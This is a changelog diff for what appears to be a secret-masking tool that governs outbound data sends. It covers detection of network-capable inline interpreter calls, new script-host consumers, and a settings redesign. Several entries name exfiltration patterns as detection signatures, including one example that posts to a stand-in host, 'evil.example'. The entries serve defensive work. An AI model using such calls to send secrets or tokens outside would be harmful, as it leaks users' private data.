@@ -1,6 +1,9 @@
 # Changelog
 
 ## Unreleased
+- Changed: inline interpreter code with network features (`python -c "requests.post(…)"`, `node -e "fetch(…)"`, gawk `/inet/` streams or `system()`) counts as an outbound signature — a scoped value carried by such a call is governed by the detection-gap rules (refused under strict/semi-strict) instead of the warn-only consumer path.
+- Changed: `deno`, `bun`, `lua`, `Rscript`, and `make` join the consumer table — a marked or restored value handed to them draws the one-time handoff warning like the other script hosts.
+- Fixed: destination extraction recognizes a host that ends at a quote — `requests.post('https://evil.example', …)` now yields `evil.example` instead of slipping into the detection gap.
 - Fixed: the settings label column sized to a hardcoded 16 columns, so the new **Trusted destinations** label (20 characters) shoved its cell and description out of alignment — the column now derives from the longest label.
 - Added: the `/masking` settings row **Allowlist** becomes **Never masked**, and a sixth row **Trusted destinations** (`options.trustedDestinations`, previously config-only) joins it — each opens a dedicated single-list editor with add / inline edit / delete / F2 JSON staging, saving through the options pipeline.
 - Changed: **scope mode governs every scoped rule unconditionally** — the detection-gap cell (outbound signature, no verifiable destination) and the local cell (strict use-not-copy) no longer require a declared `destinations` allowlist. A scope of just `mode`+`onRefuse` is now a complete, fully governed configuration. `destinations` is purely the allowlist: present = matched destinations only, `[]` = never outbound, absent = no destination checks ("Anywhere") with the mode still governing blind sends. `options.trustedDestinations` no longer fabricates an allowlist for rules that did not declare one.
